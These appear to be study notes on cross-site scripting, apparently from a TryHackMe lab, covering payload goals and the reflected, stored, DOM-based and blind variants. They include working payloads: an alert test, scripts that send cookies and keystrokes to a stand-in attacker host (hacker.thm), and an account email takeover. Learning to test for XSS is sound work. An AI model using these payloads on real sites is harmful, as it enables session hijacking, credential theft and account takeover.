# Cross-Site Scripting

In XSS, the payload in the JavaScript Script we wqnt to run on the target's machine.
There are two parts in a payload: the Intention and the Modification.
The intention is what we wish the JavaScript to do. The Modification is the changes to the code we need to make in order to exploit the vulnerability.

## Examples of Intentions: 

### Proof of concept:

The goal is to verify if the XSS is achievable or not.
The fastest way is to create a JavaScript alert with this payload : `<script> alert('XSS'); </script>`

### Session Stealing

There are lots of information in cookies on the target's machine. The goal is to have these cookies to take over the target's session and be logged as the user.
To do so, we can use this payload : `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
The JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged.

### Key logger

With the key logger, anything typed on the webpage will be forwarded to a website under the hacker's control. It can be very damaging if credit card details or private information is stored on the web application's database.
Here is an example : `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

### Business logic

The next payload is about calling a particular network resource or JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
`<script>user.changeEmail('attacker@hacker.thm');</script>`

## Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without validation.
We can test it by testing every possible point of entry including parameters in URL query strings, URL file path or HTTP headers.

## Stored XSS

It happens when the XSS payload is stored on the web application and gets run when other users visit the website or webpage.
We can test it by testing every possible point of entry where it seems data is stored and shawn back on areas that other users have access to such as comments on a blog, user profile information or website listings.

## DOM-Based XSS

DOM stands for Document Object Model and is a programming interface in HTML and XML documents. It represnets the page so that programs can change the document's structure, style and content.
DOM-based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
The execution occurs when the website's JavaScript code acts as input or user interaction.
To test it, it requires a certain amount of knowledge in JavaScript to read the source code. We need to look for parts of code that access certain variables that an attacker can have control over such as "window.location.X" parameters. We can then see how they're handled.

## Blind XSS

The Blind XSS is similar to the stored XSS but we can't see the payload working or be able to test it against yourself first.
To test it we need to ensure that the payload has a callback. A callback is something we put on the payload to have a feedback on the script.
A popular tool for Blind XSS is XSS hunter Express.



An XSS polyglot is a string of text which can escape attributes, tags and bypasses.
